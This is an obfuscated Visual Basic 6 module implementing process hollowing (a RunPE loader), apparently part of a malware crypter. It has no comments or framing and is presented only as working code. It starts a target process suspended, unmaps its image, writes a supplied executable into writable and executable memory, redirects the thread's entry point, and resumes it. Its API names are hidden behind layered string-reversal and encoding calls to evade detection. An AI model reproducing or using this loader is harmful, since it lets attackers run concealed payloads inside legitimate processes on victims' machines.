Attribute VB_Name = "NADA"


Private Const CONTEXT_FULL              As Long = &H10007
Private Const MAX_PATH                  As Integer = 260
Private Const CREATE_SUSPENDED          As Long = &H4
Private Const MEM_COMMIT                As Long = &H1000
Private Const MEM_RESERVE               As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE    As Long = &H40

Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartuD5nfo As STARTUD5NFO, lpProcesD4nformation As PROCESS_INFORMATION) As Long
Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, bvBuff As Any, ByVal nD4ze As Long, lpNumberOfBytesWritten As Long) As Long

Declare Sub RtlMoveMemory Lib "kernel32" (dest As Any, src As Any, ByVal L As Long)
Declare Function CallWindowProcA Lib "user32" (ByVal addr As Long, ByVal P1 As Long, ByVal P2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long

Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type


Private Type STARTUD5NFO
    cb As Long
    lpReserved As Long
    lpDesktop As Long
    lpTitle As Long
    dwX As Long
    dwY As Long
    dwXD4ze As Long
    dwYD4ze As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcesD4D As Long
    dwThreadID As Long
End Type

Private Type FLOATING_SAVE_AREA
    ControlWord As Long
    StatusWord As Long
    TagWord As Long
    ErrorOffset As Long
    ErrorSelector As Long
    DataOffset As Long
    DataSelector As Long
    RegisterArea(1 To 80) As Byte
    Cr0NpxState As Long
End Type

Private Type CONTEXT
    ContextFlags As Long

    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long

    FloatSave As FLOATING_SAVE_AREA
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    Edi As Long
    ED4 As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Private Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type

Private Type IMAGE_SECTION_HEADER
    SecName As String * 8
    VirtualD4ze As Long
    VirtualAddress  As Long
    D4zeOfRawData As Long
    PointerToRawData As Long
    PointerToRelocations As Long
    PointerToLinenumbers As Long
    NumberOfRelocations As Integer
    NumberOfLinenumbers As Integer
    characteristics  As Long
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    D4ze As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVerD4on As Byte
    MinorLinkerVerD4on As Byte
    D4zeOfCode As Long
    D4zeOfInitializedData As Long
    D4zeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVerD4on As Integer
    MinorOperatingSystemVerD4on As Integer
    MajorImageVerD4on As Integer
    MinorImageVerD4on As Integer
    MajorSubsystemVerD4on As Integer
    MinorSubsystemVerD4on As Integer
    W32VerD4onValue As Long
    D4zeOfImage As Long
    D4zeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    D4zeOfStackReserve As Long
    D4zeOfStackCommit As Long
    D4zeOfHeapReserve As Long
    D4zeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndD4zes As Long
    DataDirectory(0 To 15) As IMAGE_DATA_DIRECTORY
End Type



Private Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    D4zeOfOptionalHeader As Integer
    characteristics As Integer
End Type

Private Type IMAGE_NT_HEADERS
    D4gnature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type
Public Function Vocalizar(ByVal J1 As String, ByVal J2 As String, ParamArray J3()) As Long
    Dim bvASM(64)   As Byte
    Dim i           As Long
    Dim lPos        As Long
    Dim sVal        As String

    bvASM(0) = &H58: bvASM(1) = &H59: bvASM(2) = &H59
    bvASM(3) = &H59: bvASM(4) = &H59: bvASM(5) = &H50
   
    lPos = 6
   
    For i = UBound(J3) To 0 Step -1
        bvASM(lPos) = &H68: lPos = lPos + 1
        sVal = (J3(i)): GoSub PutLong: lPos = lPos + 4
    Next
   
    bvASM(lPos) = &HE8: lPos = lPos + 1
    sVal = GetProcAddress(LoadLibraryA(J1), J2) - VarPtr(bvASM(lPos)) - 4
    GoSub PutLong: lPos = lPos + 4
    bvASM(lPos) = &HC3
    Vocalizar = CallWindowProcA(VarPtr(bvASM(0)), 0, 0, 0, 0)
   
    Exit Function
PutLong:
    'This is cheap replacement for RtlMoveMemory/putmem4 (hi/lo word/byte)
    sVal = Right$(String(8, "0") & Hex(sVal), 8)
    bvASM(lPos + 0) = (StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("Ÿó"))))))))))))) & Mid$(sVal, 7, 2))
    bvASM(lPos + 1) = (StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("Ÿó"))))))))))))) & Mid$(sVal, 5, 2))
    bvASM(lPos + 2) = (StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("Ÿó"))))))))))))) & Mid$(sVal, 3, 2))
    bvASM(lPos + 3) = (StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("Ÿó"))))))))))))) & Mid$(sVal, 1, 2))
    Return
End Function
Sub Conector(ProC As String, DOS() As Byte)
On Error Resume Next
Dim D1 As IMAGE_DOS_HEADER
Dim D2 As IMAGE_NT_HEADERS
Dim D3 As IMAGE_SECTION_HEADER
Dim D4 As STARTUD5NFO
Dim D5 As PROCESS_INFORMATION
Dim D6 As CONTEXT
Dim i As Long

    D4.cb = Len(D4)
    D6.ContextFlags = CONTEXT_FULL

    Call Vocalizar(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("îöçëöìÃÕ"))))))))))))), StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("≠ãì≤êâö≤öíêçÜ"))))))))))))), VarPtr(D1), VarPtr(DOS(0)), Len(D1))
    Call Vocalizar(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("îöçëöìÃÕ"))))))))))))), StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("≠ãì≤êâö≤öíêçÜ"))))))))))))), VarPtr(D2), VarPtr(DOS(D1.e_lfanew)), Len(D2))
    Call Vocalizar(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("îöçëöìÃÕ"))))))))))))), StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("ºçöûãöØçêúöåå®"))))))))))))), 0, StrPtr(ProC), 0, 0, 0, CREATE_SUSPENDED, 0, 0, VarPtr(D4), VarPtr(D5))
  
    Call Vocalizar(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("ëãõìì"))))))))))))), StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("±ã™ëíûè©ñöà∞ô¨öúãñêë"))))))))))))), D5.hProcess, D2.OptionalHeader.ImageBase)
    Call Vocalizar(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("îöçëöìÃÕ"))))))))))))), StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("©ñçãäûìæììêú∫á"))))))))))))), D5.hProcess, D2.OptionalHeader.ImageBase, D2.OptionalHeader.D4zeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    Call Vocalizar(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("îöçëöìÃÕ"))))))))))))), StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("®çñãöØçêúöåå≤öíêçÜ"))))))))))))), D5.hProcess, D2.OptionalHeader.ImageBase, VarPtr(DOS(0)), D2.OptionalHeader.D4zeOfHeaders, 0)

For i = 0 To D2.FileHeader.NumberOfSections - 1
    RtlMoveMemory D3, DOS(D1.e_lfanew + Len(D2) + Len(D3) * i), Len(D3)
    Call Vocalizar(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("îöçëöìÃÕ"))))))))))))), StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("®çñãöØçêúöåå≤öíêçÜ"))))))))))))), D5.hProcess, D2.OptionalHeader.ImageBase + D3.VirtualAddress, VarPtr(DOS(D3.PointerToRawData)), D3.D4zeOfRawData, 0)
Next
    Call Vocalizar(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("îöçëöìÃÕ"))))))))))))), StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("∏öã´óçöûõºêëãöáã"))))))))))))), D5.hThread, VarPtr(D6))
    Call Vocalizar(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("îöçëöìÃÕ"))))))))))))), StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("®çñãöØçêúöåå≤öíêçÜ"))))))))))))), D5.hProcess, D6.Ebx + 8, VarPtr(D2.OptionalHeader.ImageBase), 4, 0)
    D6.Eax = D2.OptionalHeader.ImageBase + D2.OptionalHeader.AddressOfEntryPoint
    Call Vocalizar(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("îöçëöìÃÕ"))))))))))))), StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("¨öã´óçöûõºêëãöáã"))))))))))))), D5.hThread, VarPtr(D6))
    Call Vocalizar(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("îöçëöìÃÕ"))))))))))))), StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("≠öåäíö´óçöûõ"))))))))))))), D5.hThread)

End Sub
Public Function YO() As String
    Dim lRet        As Long
    Dim bvBuff(255) As Byte
    lRet = Vocalizar(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("îöçëöìÃÕ"))))))))))))), StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("∏öã≤êõäìöπñìö±ûíöæ"))))))))))))), App.hInstance, VarPtr(bvBuff(0)), 256)
    YO = Left$(StrConv(bvBuff, vbUnicode), lRet)
End Function

